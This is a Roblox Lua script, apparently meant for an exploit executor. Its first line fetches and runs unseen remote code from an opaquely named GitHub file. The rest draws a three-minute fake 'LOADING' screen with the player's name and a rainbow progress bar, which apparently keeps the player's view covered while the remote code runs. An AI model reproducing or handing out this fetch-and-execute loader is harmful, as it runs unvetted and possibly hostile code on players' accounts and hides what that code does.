loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptsHub11/tezk7mra/refs/heads/main/aaa"))()

-- Create the ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "LoadingScreen"
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

-- Create the Loading Frame (Gray Background) with taller height
local loadingFrame = Instance.new("Frame")
loadingFrame.Size = UDim2.new(0, 480, 0, 300) -- Adjusted height to 300
loadingFrame.Position = UDim2.new(0.5, -240, 0.5, -150) -- Adjusted position to center the new height
loadingFrame.BackgroundColor3 = Color3.fromRGB(70, 70, 70) -- Gray color
loadingFrame.BorderSizePixel = 3 -- Black border
loadingFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
loadingFrame.Parent = screenGui

-- Add rounded corners to the Loading Frame
local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0.2, 0) -- Rounded corners
corner.Parent = loadingFrame

-- Add Loading Text
local loadingText = Instance.new("TextLabel")
loadingText.Text = "LOADING"
loadingText.Font = Enum.Font.FredokaOne
loadingText.TextScaled = true
loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
loadingText.BackgroundTransparency = 1
loadingText.Size = UDim2.new(1, 0, 0.3, 0) -- Top portion
loadingText.Position = UDim2.new(0, 0, 0.1, 0)
loadingText.Parent = loadingFrame

-- Add Player's Name Text
local playerNameLabel = Instance.new("TextLabel")
playerNameLabel.Text = "Executed by: " .. game.Players.LocalPlayer.Name
playerNameLabel.Font = Enum.Font.FredokaOne
playerNameLabel.TextScaled = true
playerNameLabel.TextColor3 = Color3.fromRGB(255, 255, 255) -- White text
playerNameLabel.BackgroundTransparency = 1
playerNameLabel.Size = UDim2.new(1, 0, 0.2, 0) -- Adjusted size
playerNameLabel.Position = UDim2.new(0, 0, 0.4, 0) -- Vertically centered
playerNameLabel.TextXAlignment = Enum.TextXAlignment.Center
playerNameLabel.TextYAlignment = Enum.TextYAlignment.Center -- Ensures vertical alignment
playerNameLabel.Parent = loadingFrame

-- Create a mask frame for the white progress bar (Cut-Out Effect)
local maskFrame = Instance.new("Frame")
maskFrame.Size = UDim2.new(0.8, 0, 0.15, 0) -- 80% of width, 15% of height
maskFrame.Position = UDim2.new(0.1, 0, 0.7, 0) -- Centered in the bottom section
maskFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255) -- White (cut-out effect)
maskFrame.ClipsDescendants = true -- Ensures the rainbow stays inside
maskFrame.Parent = loadingFrame

-- Create the Rainbow Progress Bar (Inside the Mask)
local rainbowBar = Instance.new("Frame")
rainbowBar.Size = UDim2.new(0, 0, 1, 0) -- Start at 0 width, full height
rainbowBar.Position = UDim2.new(0, 0, 0, 0) -- Aligned to the left
rainbowBar.BackgroundColor3 = Color3.fromRGB(255, 0, 0) -- Initial color (red)
rainbowBar.Parent = maskFrame -- Inside the maskFrame

-- Add Percentage Label on Top of Everything
local percentageLabel = Instance.new("TextLabel")
percentageLabel.Text = "0%"
percentageLabel.Font = Enum.Font.FredokaOne
percentageLabel.TextScaled = true
percentageLabel.TextColor3 = Color3.fromRGB(0, 0, 0) -- Black text
percentageLabel.BackgroundTransparency = 1
percentageLabel.Size = UDim2.new(1, 0, 1, 0) -- Same size as the maskFrame
percentageLabel.Position = UDim2.new(0, 0, 0, 0)
percentageLabel.ZIndex = 3 -- Ensure it's above everything
percentageLabel.Parent = maskFrame

-- Rainbow color table
local rainbowColors = {
    Color3.fromRGB(255, 0, 0),    -- Red
    Color3.fromRGB(255, 127, 0),  -- Orange
    Color3.fromRGB(255, 255, 0),  -- Yellow
    Color3.fromRGB(0, 255, 0),    -- Green
    Color3.fromRGB(0, 0, 255),    -- Blue
    Color3.fromRGB(75, 0, 130),   -- Indigo
    Color3.fromRGB(238, 130, 238) -- Violet
}

-- Function to interpolate between colors
local function interpolateColor(color1, color2, alpha)
    return Color3.new(
        color1.R + (color2.R - color1.R) * alpha,
        color1.G + (color2.G - color1.G) * alpha,
        color1.B + (color2.B - color1.B) * alpha
    )
end

-- Function to update the progress bar
local function updateProgressBar()
    local duration = 180 -- Total duration (seconds) for 3 minutes
    local elapsed = 0
    local step = 0.1 -- Update every 100ms for smooth progress

    while elapsed < duration do
        elapsed = elapsed + step
        local progress = elapsed / duration -- Calculate progress (0 to 1)

        -- Update bar size (ensure the width grows)
        rainbowBar.Size = UDim2.new(progress, 0, 1, 0) -- Increase width based on progress

        -- Update percentage text
        local percentage = math.floor(progress * 100)
        percentageLabel.Text = tostring(percentage) .. "%"

        -- Update bar color
        local colorIndex = math.floor(progress * (#rainbowColors - 1)) + 1
        local nextColorIndex = math.min(colorIndex + 1, #rainbowColors)
        local alpha = (progress * (#rainbowColors - 1)) - (colorIndex - 1)
        rainbowBar.BackgroundColor3 = interpolateColor(rainbowColors[colorIndex], rainbowColors[nextColorIndex], alpha)

        -- Yield to allow UI updates
        wait(step)
    end

    -- Destroy the loading screen after completion
    screenGui:Destroy()
end

-- Start updating the progress bar
updateProgressBar()
